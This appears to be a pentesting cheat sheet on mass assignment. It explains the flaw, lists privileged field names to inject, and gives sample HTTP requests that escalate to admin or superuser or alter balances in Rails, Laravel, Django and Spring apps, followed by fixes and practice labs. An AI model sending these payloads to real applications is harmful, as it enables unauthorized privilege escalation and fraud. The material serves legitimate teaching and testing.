entries.title: What Mass Assignment is
entries.body:
Mass Assignment (also known as Autobinding / Object Injection) - the application automatically transfers user input into the properties of a program object. The vulnerability arises when a user can set attributes they should not have access to: permissions, role, admin flag, balance.

It is most often found in ORM-based applications, where the object's properties are updated all at once from the request body rather than one by one. Such functionality is provided by popular frameworks: Ruby on Rails, Django, Laravel (PHP), Spring.

Example: there is a user object with the attributes username, email, password, isAdmin. Normally, through a form the user changes only username, email and password. If the server does not check which fields are allowed to be updated, the attacker adds isAdmin to the request - and gains administrator privileges.

entries.title: Where to look and how to test
entries.body:
• Any endpoints that create or update an object from the request body: registration, profile update, settings, creating an order/comment/post, import.
• First capture a "legitimate" response - which fields the server returns for the object (id, role, isAdmin, verified, balance, owner_id, status). Try sending those same names back.
• Sources of hidden field names: the GET response of the same object, documentation/Swagger/GraphQL introspection, frontend JS, leaked DB schemas, other roles (create an admin object and compare the fields).
• Set up two accounts. Change your object, adding a privileged field -> re-read the object and check whether it was applied.
• Test both create (POST) and update (PUT/PATCH): protection is often present on only one of them.
• Change the body format: form-urlencoded <-> JSON <-> multipart <-> XML - the field filter may not work for all of them.

entries.title: Typical privileged fields to try
entries.body:
Substitute these names (and their variants in snake_case / camelCase) alongside legitimate request fields:

• Permissions/role:   isAdmin, is_admin, admin, role, roles, role_id, group, group_id, permissions, is_staff, is_superuser, access_level, user_type
• Trust:               verified, is_verified, email_verified, confirmed, active, is_active, enabled, approved, status
• Ownership:           user_id, owner, owner_id, account_id, organization_id, tenant_id, created_by
• Money:               balance, credit, credits, points, price, discount, is_premium, subscription, plan
• Other:               id, uuid, password (someone else's object), reset_token, api_key

entries.title: Adding isAdmin to a JSON body
Role elevation during a profile update
entries.body:
PATCH /api/users/me HTTP/1.1
Host: vulnerable
Content-Type: application/json

{
    "email": "attacker@email.com",
    "role": "admin"
}

entries.title: Self-verification / account activation
The same fields in form-urlencoded
entries.body:
POST /users HTTP/1.1
Host: vulnerable
Content-Type: application/x-www-form-urlencoded

username=attacker&email=attacker%40email.com&password=unsafe_password&isAdmin=true

entries.title: Nested objects via bracket notation
entries.body: username=attacker&user[role]=admin&user[isAdmin]=true&account[balance]=999999

entries.title: Capture the object schema from the GET response
entries.body:
# 1. Read your object - the field names in the response are candidates for injection
GET /api/users/me HTTP/1.1
Host: vulnerable

# The response reveals hidden fields:
# { "id": 17, "username": "me", "role": "user", "isAdmin": false, "verified": false }

# 2. Send them back in an update request with the values you want
PUT /api/users/me HTTP/1.1
Host: vulnerable
Content-Type: application/json

{ "role": "admin", "isAdmin": true, "verified": true }

entries.title: Enumeration idea and sources of names
entries.body:
You will not guess a hidden field name blindly - build a wordlist for the target:
• The GET response of the same object (the most common source).
• Swagger/OpenAPI, WSDL, GraphQL introspection, .map files and frontend JS.
• Validation error responses sometimes list the expected/unknown fields.
• Create an object under a different role (for example, through the admin panel of a demo stand) and compare the set of fields.
• Brute-force common names with Intruder (role, is_admin, verified...) and watch whether the object changes after re-reading it.

entries.title: Rails - the essence and exploitation
entries.body:
Rails transfers the params hash straight into the model attributes (User.new(params[:user]), update(params[:user])). The protection is Strong Parameters: params.require(:user).permit(:email, :password). If the developer forgot permit or used permit!, any model field is assigned.

Exploitation: alongside the legitimate fields you add a model attribute or DB column - admin, role, account_id.

Historically (Rails < 4, attr_accessible) this flaw was used to gain commit access to GitHub repositories.

entries.title: Rails - payload with a nested user hash
entries.body:
POST /users HTTP/1.1
Host: vulnerable
Content-Type: application/x-www-form-urlencoded

user[email]=attacker%40email.com&user[password]=Passw0rd!&user[admin]=true

entries.title: Laravel - the essence and exploitation
entries.body:
Eloquent mass-assigns via create()/fill()/update(). The protection on the model is $fillable (allow-list) or $guarded (block-list). Dangerous configurations:
• $guarded = []; - everything is allowed to be assigned.
• A sensitive column (is_admin, role_id) ended up neither in $guarded nor outside $fillable.

Exploitation: you send the table column name as an ordinary form/JSON field - Eloquent writes it into the model.

entries.title: Laravel - payload (column as an ordinary field)
entries.body:
POST /register HTTP/1.1
Host: vulnerable
Content-Type: application/x-www-form-urlencoded

name=attacker&email=attacker%40email.com&password=secret&is_admin=1&role_id=1

entries.title: Django - the essence and exploitation
entries.body:
In Django mass assignment comes through ModelForm and DRF serializers (ModelSerializer). It is dangerous when fields are defined too broadly:
• fields = '__all__' in the form/serializer Meta - the set also includes is_staff, is_superuser, is_active.
• There are no read_only_fields for sensitive columns.

Exploitation: you add to the JSON/form a model field that should not be editable.

entries.title: Django - payload (DRF, elevation to staff/superuser)
entries.body:
{
    "username": "attacker",
    "email": "attacker@email.com",
    "is_staff": true,
    "is_superuser": true,
    "is_active": true
}

entries.title: Spring MVC - the essence and exploitation
entries.body:
Spring MVC automatically binds request parameters into the fields of a command/DTO object (data binding). If the controller accepts the model entity directly and does not restrict the fields, the attacker sets any property, including privileged ones.

Restrictions are set via @InitBinder with setAllowedFields()/setDisallowedFields(), a DTO without sensitive fields, or @JsonIgnore. Their absence = mass assignment.

Exploitation: you add the entity's field name as an ordinary request parameter.

entries.title: Spring - payload (binding a privileged field)
entries.body:
POST /account/update HTTP/1.1
Host: vulnerable
Content-Type: application/x-www-form-urlencoded

username=attacker&email=attacker%40email.com&role=ADMIN&enabled=true

entries.title: How to fix mass assignment
entries.body:
• Use an allow-list of fields permitted for binding, not a block-list: Rails permit, Laravel $fillable, DRF fields=[...] + read_only_fields, Spring setAllowedFields/DTO.
• Never bind the request straight into the domain model - use a separate DTO/ViewModel with only the fields the user is allowed to change.
• Set sensitive fields (role, flags, owner, balance) only through server-side logic, not from input.
• Do not rely on hiding a field on the frontend - validate on the server.
• Cover it with tests: an attempt to set a privileged field must be ignored or rejected.

entries.title: Where to practice
entries.body:
• PentesterAcademy - Mass Assignment I (attackdefense, cid=1964)
• PentesterAcademy - Mass Assignment II (attackdefense, cid=1922)
• Root Me - API - Mass Assignment (root-me.org, Web-Server)
